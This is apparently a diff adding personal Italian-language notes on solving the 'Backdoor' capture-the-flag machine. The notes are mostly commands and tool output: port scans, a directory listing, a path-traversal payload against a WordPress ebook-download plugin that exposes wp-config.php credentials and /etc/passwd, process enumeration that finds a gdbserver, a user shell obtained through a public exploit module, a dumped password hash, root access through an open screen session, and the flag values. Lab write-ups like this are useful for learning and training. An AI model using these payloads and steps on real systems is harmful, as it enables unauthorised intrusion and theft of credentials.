@@ -1,0 +1,236 @@
+10.10.11.125
+
+
+sudo masscan -p1-65535 --rate 1000 --banners --open -e tun0 10.10.11.125
+Discovered open port 1337/tcp on 10.10.11.125                                  
+Discovered open port 22/tcp on 10.10.11.125                                    
+Discovered open port 80/tcp on 10.10.11.125
+
+
+nmap -sC -sV -Pn -p22,80,1337 10.10.11.125
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 b4:de:43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 (RSA)
+|   256 aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 (ECDSA)
+|_  256 d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 (ED25519)
+80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-generator: WordPress 5.8.1
+|_http-title: Backdoor &#8211; Real-Life
+1337/tcp open  waste?
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+Porta 80:
+    c'è un sito su una mostra d'arte, è fatto con wordpress quindi posso provare ad accedere a wp-admin magari
+
+    provo con le credenziali di default (admin:password)
+
+    Error: The password you entered for the username admin is incorrect. Lost your password?
+
+    quindi a quanto pare admin esiste anche se la pwd è sbagliata, potrebbe essere utile dopo
+
+
+    GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://10.10.11.125/ ----
++ http://10.10.11.125/index.php (CODE:301|SIZE:0)                                                                   
++ http://10.10.11.125/server-status (CODE:403|SIZE:277)                                                             
+==> DIRECTORY: http://10.10.11.125/wp-admin/                                                                        
+==> DIRECTORY: http://10.10.11.125/wp-content/                                                                      
+==> DIRECTORY: http://10.10.11.125/wp-includes/                                                                     
++ http://10.10.11.125/xmlrpc.php (CODE:405|SIZE:42)                                                                 
+                                                                                                                    
+---- Entering directory: http://10.10.11.125/wp-admin/ ----
++ http://10.10.11.125/wp-admin/admin.php (CODE:302|SIZE:0)                                                          
+==> DIRECTORY: http://10.10.11.125/wp-admin/css/                                                                    
+==> DIRECTORY: http://10.10.11.125/wp-admin/images/                                                                 
+==> DIRECTORY: http://10.10.11.125/wp-admin/includes/                                                               
++ http://10.10.11.125/wp-admin/index.php (CODE:302|SIZE:0)                                                          
+==> DIRECTORY: http://10.10.11.125/wp-admin/js/                                                                     
+==> DIRECTORY: http://10.10.11.125/wp-admin/maint/                                                                  
+==> DIRECTORY: http://10.10.11.125/wp-admin/network/                                                                
+==> DIRECTORY: http://10.10.11.125/wp-admin/user/                                                                   
+                                                                                                                    
+---- Entering directory: http://10.10.11.125/wp-content/ ----
++ http://10.10.11.125/wp-content/index.php (CODE:200|SIZE:0)                                                        
+==> DIRECTORY: http://10.10.11.125/wp-content/plugins/                                                              
+==> DIRECTORY: http://10.10.11.125/wp-content/themes/                                                               
+==> DIRECTORY: http://10.10.11.125/wp-content/upgrade/                                                              
+==> DIRECTORY: http://10.10.11.125/wp-content/uploads/                                                              
+                                                                                                                    
+---- Entering directory: http://10.10.11.125/wp-includes/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+==> DIRECTORY: http://10.10.11.125/wp-includes/assets/                                                              
+==> DIRECTORY: http://10.10.11.125/wp-includes/blocks/                                                              
+==> DIRECTORY: http://10.10.11.125/wp-includes/certificates/                                                        
+==> DIRECTORY: http://10.10.11.125/wp-includes/css/                                                                 
+==> DIRECTORY: http://10.10.11.125/wp-includes/customize/                                                           
+==> DIRECTORY: http://10.10.11.125/wp-includes/fonts/                                                               
+==> DIRECTORY: http://10.10.11.125/wp-includes/images/                                                              
+==> DIRECTORY: http://10.10.11.125/wp-includes/js/                                                                  
+==> DIRECTORY: http://10.10.11.125/wp-includes/sitemaps/                                                            
+==> DIRECTORY: http://10.10.11.125/wp-includes/widgets/                                                             
+                                                                                                                    
+---- Entering directory: http://10.10.11.125/wp-admin/css/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                                                                    
+---- Entering directory: http://10.10.11.125/wp-admin/images/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                                                                     
+---- Entering directory: http://10.10.11.125/wp-admin/includes/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
++ http://10.10.11.125/wp-admin/includes/admin.php (CODE:500|SIZE:0)                                                 
+                                                                                                                    
+---- Entering directory: http://10.10.11.125/wp-admin/js/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+
+
+
+    XML-RPC server accepts POST requests only.
+
+    <?xml version="1.0" encoding="UTF-8"?>
+    <methodResponse>
+    <fault>
+        <value>
+        <struct>
+            <member>
+            <name>faultCode</name>
+            <value><int>-32700</int></value>
+            </member>
+            <member>
+            <name>faultString</name>
+            <value><string>parse error. not well formed</string></value>
+            </member>
+        </struct>
+        </value>
+    </fault>
+    </methodResponse>
+
+    purtroppo comunque non riesco ad ottenre nulla da xmlrpc 
+
+
+    sotto http://10.10.11.125/wp-content/plugins/ c'è effettivamente un plugin:
+    
+    http://10.10.11.125/wp-content/plugins/ebook-download/readme.txt            la versione è la 1.1
+
+    https://www.exploit-db.com/exploits/39575       ---> questo mi dovrebbe permettere di scaricare qualunque file
+
+    http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php
+
+    define( 'DB_NAME', 'wordpress' );
+
+    /** MySQL database username */
+    define( 'DB_USER', 'wordpressuser' );
+
+    /** MySQL database password */
+    define( 'DB_PASSWORD', 'MQYBJSaD#DxG6qbm' );
+
+    /** MySQL hostname */
+    define( 'DB_HOST', 'localhost' );
+
+
+    http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../../../../../../../etc/passwd
+
+    posso usare questo accesso per capire cosa c'è running sulla porta 1337
+
+    per ogni processo posso accedere ai file in /proc/<PID>/ per capire cosa fa ogni processo sulla macchina (tipo bruteforce)
+    ad esempio per firefox sulla mia macchina locale:
+
+    /proc/42530
+    cat cmdline                                               
+    /usr/lib/firefox-esr/firefox-esr-contentproc-parentBuildID20210901125844-prefsLen9600-prefMapSize220310-appdir/usr/lib/firefox-esr/browser1880truerdd 
+
+    quindi posso provare a guardare tutti i file /proc/<PID>/cmdline e vedere se contengono la stringa "1337" 
+    devo fare per forza uno script perchè non posso controllare tutti i pid possibili a mano
+
+    PID = 891
+    ../../../../../../../../../../../../proc/891/cmdline../../../../../../../../../../../../proc/891/cmdline../../../../../../../../../../../../proc/891/cmdline/bin/sh-cwhile true;do su user -c "cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;"; done<script>window.close()</script>
+
+    while true;do su user -c "cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;"; done
+
+    quindi c'è in esecuzione gdbserver
+
+    forse posso usare:
+    https://www.rapid7.com/db/modules/exploit/multi/gdb/gdb_server_exec/
+
+    
+
+
+
+PORT 1337:
+    1337 means "elite" in hacker/cracker spelling (1=L, 3=E, 7=T, "LEET"="ELITE"). Because of the reference, it may be used by some backdoors.
+
+    non riesco a collegarmi ne con telnet ne con netcat e non so di che servizio si tratta 
+
+
+
+
+
+
+
+whoami
+    user
+    pwd
+    /home/user
+    cat user.txt
+    9595d435ec422dfc8d5f9b6528fe58ee
+
+
+usando l'exploit su gdb sono riuscito ad accedere come utente user 
+
+ora potrei anche provare a connettermi a mysql di cui ho trovato le crdenziali prima 
+
+mysql -u wordpressuser -p wordpress  ( e poi inserisco la pwd quando me la chiede)
+
+mysql> use wordpress;
+use wordpress;
+Database changed
+mysql> show tables;
+show tables;
++-----------------------+
+| Tables_in_wordpress   |
++-----------------------+
+| wp_commentmeta        |
+| wp_comments           |
+| wp_links              |
+| wp_options            |
+| wp_postmeta           |
+| wp_posts              |
+| wp_term_relationships |
+| wp_term_taxonomy      |
+| wp_termmeta           |
+| wp_terms              |
+| wp_usermeta           |
+| wp_users              |
++-----------------------+
+
+mysql> select * from wp_users;
+select * from wp_users;
++----+------------+------------------------------------+---------------+---------------------+---------------------+---------------------+-----------------------------------------------+-------------+--------------+
+| ID | user_login | user_pass                          | user_nicename | user_email          | user_url            | user_registered     | user_activation_key                           | user_status | display_name |
++----+------------+------------------------------------+---------------+---------------------+---------------------+---------------------+-----------------------------------------------+-------------+--------------+
+|  1 | admin      | $P$Bt8c3ivanSGd2TFcm3HV/9ezXPueg5. | admin         | admin@wordpress.com | http://backdoor.htb | 2021-07-24 13:19:11 | 1640278089:$P$BeCNxoiifwOIhW/gh217LRsUvkwwTp/ |           0 | admin        |
++----+------------+------------------------------------+---------------+---------------------+---------------------+---------------------+-----------------------------------------------+-------------+--------------+
+
+posso provare ad usare hashcat:
+
+
+$P$Bt8c3ivanSGd2TFcm3HV/9ezXPueg5.
+
+
+export TERM=xterm
+screen -x root/root
+
+root@Backdoor:~# cat root.txt
+cat root.txt
+44eb911dd9ad282adafd8180476812e4
+
+
